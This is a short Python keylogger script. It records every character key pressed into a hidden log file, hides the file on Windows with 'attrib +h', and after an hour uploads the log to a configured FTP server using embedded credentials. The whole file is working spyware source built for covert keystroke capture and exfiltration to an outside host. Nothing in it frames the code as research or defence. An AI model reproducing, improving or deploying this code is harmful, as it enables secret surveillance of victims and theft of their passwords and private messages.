import os
import threading
from pynput import keyboard
from ftplib import FTP

# FTP Configurations
FTP_SERVER = 'server.ip'
FTP_USERNAME = 'username'
FTP_PASSWORD = '123'
UPLOAD_INTERVAL = 3600  # Upload interval in seconds (1 hour)

# This is the file that will log the keys
LOG_FILE = '.log.txt'  # Hidden log file name


# Function to handle keypresses and log them
def keypressed(key):
    try:
        char = key.char
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(char)
    except AttributeError:
        # Special key (e.g., shift, ctrl) pressed, not logging
        pass


# Function to upload the log file to the specified FTP server
def send_log():
    try:
        with FTP(FTP_SERVER) as ftp:
            ftp.login(user=FTP_USERNAME, passwd=FTP_PASSWORD)
            with open(LOG_FILE, 'rb') as file:
                ftp.storbinary(f'STOR {os.path.basename(LOG_FILE)}', file)
        return "File uploaded"
    except Exception as e:
        return f"Error uploading log file: {e}"


# Main function that starts the logger
def main():
    # Ensure the log file exists
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w'):
            pass

    # Set the log file as hidden (specific to Windows)
    if os.name == 'nt':  # Check if it's Windows
        os.system(f'attrib +h {LOG_FILE}')

    # Start key listener
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()

    # Schedule log file upload
    threading.Timer(UPLOAD_INTERVAL, send_log).start()


if __name__ == "__main__":
    main()
